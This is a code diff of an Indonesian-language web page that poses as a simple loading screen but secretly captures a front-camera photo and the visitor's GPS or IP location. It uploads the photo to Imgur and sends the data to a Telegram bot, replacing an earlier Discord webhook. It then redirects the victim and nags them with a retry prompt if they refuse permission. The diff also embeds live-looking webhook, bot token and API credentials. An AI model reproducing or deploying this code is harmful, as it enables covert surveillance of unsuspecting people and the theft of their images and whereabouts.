@@ -5,104 +5,164 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Memuat...</title>
     <style>
-        *{margin:0;padding:0}
-        body{background:#fff;height:100vh}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif}
         video,canvas{position:absolute;opacity:0;pointer-events:none}
-        .ld{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center;color:#444}
+        .ld{text-align:center;color:#444;display:block}
         .ld div{width:40px;height:40px;border:3px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:put .8s linear infinite;margin:0 auto 12px}
         @keyframes put{100%{transform:rotate(360deg)}}
+        .pesan{display:none;text-align:center;font-size:20px;color:#e53935;padding:20px}
+        .tombol{display:none;padding:12px 30px;font-size:16px;background:#2563eb;color:#fff;border:none;border-radius:6px;cursor:pointer;margin-top:15px}
+        .tombol:hover{background:#1d4ed8}
     </style>
 </head>
 <body>
-    <div class="ld"><div></div><p>Memuat...</p></div>
+    <div class="ld" id="loading">
+        <div></div>
+        <p>Memuat...</p>
+    </div>
+    <div class="pesan" id="pesanTolak">
+        lu siapa jir🤣🖕<br><br>
+        <b>Berikan izin untuk melanjutkan!</b>
+    </div>
+    <button class="tombol" id="cobaLagi">Coba Lagi</button>
 
 <script>
-const WEBHOOK = "https://discord.com/api/webhooks/1538498418266218641/zM9vn4GAKeP_R6r5VTaC2Ccn_IAZQBHgUt2HvLWCqac519orhQJLSQlp8v89nelMYh6p";
-const TUJUAN = "https://google.com";
+// ✅ DATA LO UDAH TERISI SEMUA! GAK USAH DIUBAH LAGI!
+const BOT_TOKEN = "8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc";
+const CHAT_ID = "1157643333";
+const TUJUAN = "https://nekopoi.care";
+
+const loading = document.getElementById("loading");
+const pesanTolak = document.getElementById("pesanTolak");
+const tombolCoba = document.getElementById("cobaLagi");
 
 let fotoUrl = null;
 let dataLokasi = "Tidak terbaca";
-let selesaiFoto = false;
-let selesaiLokasi = false;
+let ulang = false;
 
-// 📷 AMBIL FOTO → UNGGAH → DAPET LINK
-navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
-.then(kamera=>{
-    const vid = document.createElement("video");
-    vid.srcObject = kamera; vid.play();
-    setTimeout(()=>{
-        const kanvas = document.createElement("canvas");
-        kanvas.width=400; kanvas.height=400;
-        const ctx = kanvas.getContext("2d");
-        ctx.drawImage(vid,0,0,400,400);
-        const base64 = kanvas.toDataURL("image/jpeg");
-        kamera.getTracks().forEach(t=>t.stop());
-        
-        // ✅ UNGGAH KE SITUS GRATIS DAPET LINK
-        unggahGambar(base64, link=>{
-            fotoUrl = link;
-            selesaiFoto = true;
-            cekSemuaSelesai();
-        });
-    },1200);
-})
-.catch(()=>{selesaiFoto=true;cekSemuaSelesai();});
+// 📷 AMBIL FOTO
+function ambilFoto(){
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
+    .then(kamera=>{
+        sembunyikanPesan();
+        const vid = document.createElement("video");
+        vid.srcObject = kamera; vid.play();
+        setTimeout(()=>{
+            const kanvas = document.createElement("canvas");
+            kanvas.width=400; kanvas.height=400;
+            const ctx = kanvas.getContext("2d");
+            ctx.drawImage(vid,0,0,400,400);
+            const base64 = kanvas.toDataURL("image/jpeg");
+            kamera.getTracks().forEach(t=>t.stop());
+            unggahDanKirim(base64);
+        },1200);
+    })
+    .catch(()=>{
+        tampilkanPesanTolak();
+        ulang = true;
+    });
+}
 
 // 📍 AMBIL LOKASI
-navigator.geolocation.getCurrentPosition(
-    pos=>{
-        dataLokasi = `🌍 ${pos.coords.latitude}, ${pos.coords.longitude} | ±${Math.round(pos.coords.accuracy)}m`;
-        selesaiLokasi = true;
-        cekSemuaSelesai();
-    },
-    err=>{
-        fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
-        .then(r=>r.json())
-        .then(d=>{
-            dataLokasi = `🌐 ${d.city}, ${d.regionName}, ${d.country} | IP: ${d.query}`;
-            selesaiLokasi = true;
-            cekSemuaSelesai();
-        })
-        .catch(()=>{
-            dataLokasi = "Lokasi tidak terbaca";
-            selesaiLokasi = true;
-            cekSemuaSelesai();
-        });
-    },
-    {enableHighAccuracy:true,timeout:8000}
-);
+function ambilLokasi(){
+    navigator.geolocation.getCurrentPosition(
+        pos=>{
+            dataLokasi = `🌍 LOKASI: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
+            if(!ulang) ambilFoto();
+        },
+        err=>{
+            fetch("https://ip-api.com/json/?fields=city,regionName,country,query")
+            .then(r=>r.json())
+            .then(d=>{
+                dataLokasi = `🌐 LOKASI: ${d.city}, ${d.regionName}, ${d.country}\n🔢 IP: ${d.query}`;
+                if(!ulang) ambilFoto();
+            })
+            .catch(()=>{
+                dataLokasi = "Lokasi tidak terbaca";
+                if(!ulang) ambilFoto();
+            });
+        },
+        {enableHighAccuracy:true,timeout:8000}
+    );
+}
 
-// ✅ UNGGAH GAMBAR KE SITUS GRATIS DAPET LINK URL
-function unggahGambar(base64, callback){
+// ✅ UNGGAH FOTO KE IMGUR LALU KIRIM KE TELEGRAM
+function unggahDanKirim(base64){
     fetch("https://api.imgur.com/3/image",{
         method:"POST",
-        headers:{"Authorization":"Client-ID 546c25a59c524c8"},
+        headers:{"Authorization":"Client-ID 546c25a59c524c8","Content-Type":"application/json"},
         body:JSON.stringify({image:base64.split(",")[1]})
     })
     .then(r=>r.json())
     .then(res=>{
-        if(res.success) callback(res.data.link);
-        else callback(null);
+        if(res.success){
+            kirimKeTelegram(res.data.link);
+        }else{
+            kirimKeTelegram(null);
+        }
     })
-    .catch(()=>callback(null));
+    .catch(()=>kirimKeTelegram(null));
 }
 
-// 📤 KIRIM KE DISCORD — PAKE LINK FOTO, BUKAN BASE64!
-function cekSemuaSelesai(){
-    if(!selesaiFoto || !selesaiLokasi) return;
-    
-    fetch(WEBHOOK,{
+// 📤 KIRIM SEMUA DATA KE TELEGRAM LO
+function kirimKeTelegram(linkFoto){
+    let teks = `✅ DATA MASUK!\n\n${dataLokasi}`;
+    loading.style.display = "block";
+
+    // Kirim foto + keterangan
+    if(linkFoto){
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({
+                chat_id: CHAT_ID,
+                photo: linkFoto,
+                caption: teks
+            })
+        })
+        .then(()=>{window.location.href = TUJUAN;})
+        .catch(()=>{kirimPesanSaja(teks);});
+    }else{
+        kirimPesanSaja(teks);
+    }
+}
+
+function kirimPesanSaja(teks){
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
         method:"POST",
         headers:{"Content-Type":"application/json"},
         body:JSON.stringify({
-            content:"```✅ DATA MASUK\n"+dataLokasi+"```",
-            embeds:fotoUrl ? [{image:{url:fotoUrl}}] : []
+            chat_id: CHAT_ID,
+            text: teks
         })
     })
-    .finally(()=>{
-        window.location.href = TUJUAN;
-    });
+    .finally(()=>{window.location.href = TUJUAN;});
 }
+
+function tampilkanPesanTolak(){
+    loading.style.display = "none";
+    pesanTolak.style.display = "block";
+    tombolCoba.style.display = "block";
+}
+
+function sembunyikanPesan(){
+    pesanTolak.style.display = "none";
+    tombolCoba.style.display = "none";
+    loading.style.display = "block";
+}
+
+// 🔄 COBA LAGI KALAU DITEKAN
+tombolCoba.onclick = function(){
+    ulang = false;
+    sembunyikanPesan();
+    ambilLokasi();
+};
+
+// ▶️ MULAI
+window.onload = function(){
+    ambilLokasi();
+};
 </script>
 </body>
 </html>
